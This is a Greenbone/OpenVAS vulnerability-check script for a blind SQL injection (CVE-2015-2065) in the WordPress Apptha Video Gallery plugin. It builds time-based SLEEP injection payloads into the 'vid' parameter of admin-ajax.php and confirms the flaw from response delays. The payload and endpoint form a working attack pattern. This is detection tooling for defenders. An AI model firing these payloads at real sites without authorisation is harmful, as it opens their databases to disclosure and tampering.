# SPDX-FileCopyrightText: 2015 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

CPE = "cpe:/a:wordpress:wordpress";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.805161");
  script_version("2023-11-30T05:06:26+0000");
  script_cve_id("CVE-2015-2065");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_tag(name:"last_modification", value:"2023-11-30 05:06:26 +0000 (Thu, 30 Nov 2023)");
  script_tag(name:"creation_date", value:"2015-04-08 17:11:05 +0530 (Wed, 08 Apr 2015)");
  script_tag(name:"qod_type", value:"remote_analysis");
  script_name("WordPress Apptha Video Gallery < 2.8 Blind SQLi Vulnerability");

  script_tag(name:"summary", value:"WordPress Apptha Video Gallery is prone to a blind SQL injection
  (SQLi) vulnerability.");

  script_tag(name:"vuldetect", value:"Sends multiple crafted HTTP GET request and checks the
  response times.");

  script_tag(name:"insight", value:"Flaw is due to the videogalleryrss.php
  script, as called by an rss action in the wp-admin/admin-ajax.php script,
  not properly sanitizing user-supplied input to the 'vid' parameter.");

  script_tag(name:"impact", value:"Successful exploitation will allow remote
  attackers to inject or manipulate SQL queries in the back-end database,
  allowing for the manipulation or disclosure of arbitrary data.");

  script_tag(name:"affected", value:"WordPress Apptha Video Gallery (contus-video-gallery) plugin
  versions prior to 2.8.");

  script_tag(name:"solution", value:"Update to version 2.8 or later.");

  script_tag(name:"solution_type", value:"VendorFix");

  script_xref(name:"URL", value:"http://packetstormsecurity.com/files/130371");
  script_xref(name:"URL", value:"http://www.exploit-db.com/exploits/36058");
  script_xref(name:"URL", value:"https://wordpress.org/plugins/contus-video-gallery/changelog");

  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2015 Greenbone AG");
  script_family("Web application abuses");
  script_dependencies("gb_wordpress_http_detect.nasl");
  script_mandatory_keys("wordpress/http/detected");
  script_require_ports("Services/www", 80);

  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("host_details.inc");
include("misc_func.inc");

wait_extra_sec = 5;

if(!port = get_app_port(cpe:CPE, service:"www"))
  exit(0);

if(!dir = get_app_location(cpe:CPE, port:port))
  exit(0);

if(dir == "/")
  dir = "";

url = dir + "/wp-content/plugins/contus-video-gallery/videogalleryrss.php";
res = http_get_cache(item:url, port:port);

# e.g.
# <atom:link href="http://<redacted>/wp-content/plugins/contus-video-gallery/videogalleryrss.php" rel="self" type="application/rss+xml" />
# <guid>http://<redacted>/?videogallery=videotitle</guid>
# <link>http://<redacted>/?videogallery=videotitle</link>
if(res && res =~ "^HTTP/1\.[01] 200" && egrep(string:res, pattern:"<(atom:link|guid>|link>)[^>]+(contus-video-gallery/videogalleryrss\.php|/\?videogallery=.+)", icase:FALSE)) {

  # nb:
  # - Just a second cross-check, this should also return a 200 status code
  # - This is also used to determine the time the "original" request is taking
  url = dir + "/wp-admin/admin-ajax.php?action=rss&type=video&vid=1";
  req = http_get(item:url, port:port);
  start = unixtime();
  res = http_keepalive_send_recv(port:port, data:req);
  stop = unixtime();
  if(!res || res !~ "^HTTP/1\.[01] 200")
    exit(0);

  count = 0;
  latency = stop - start;
  rand_num = rand_str(length:4, charset:"0123456789" );
  rand_str = rand_str(length:4);

  foreach sleep(make_list(3, 5, 7)) {
    query = " AND (SELECT " + rand_num + " FROM (SELECT(SLEEP(" + sleep + ")))" + rand_str + ")";
    query = str_replace(find:" ", string:query, replace:"%20");
    url = dir + "/wp-admin/admin-ajax.php?action=rss&type=video&vid=1" + query;
    req = http_get(item:url, port:port);
    start = unixtime();
    res = http_keepalive_send_recv(port:port, data:req);
    stop = unixtime();

    time_taken = stop - start;
    if(time_taken >= sleep && time_taken <= (sleep + latency))
      count++;
  }

  if(count >= 2) {
    report = 'It was possible to conduct a blind SQL Injection (MySQL: SLEEP) into the "vid" parameter via a crafted HTTP GET request to the following URL:\n\n' + http_report_vuln_url(url:url, port:port, url_only:TRUE);
    security_message(port:port, data:report);
    exit(0);
  }
}

exit(99);
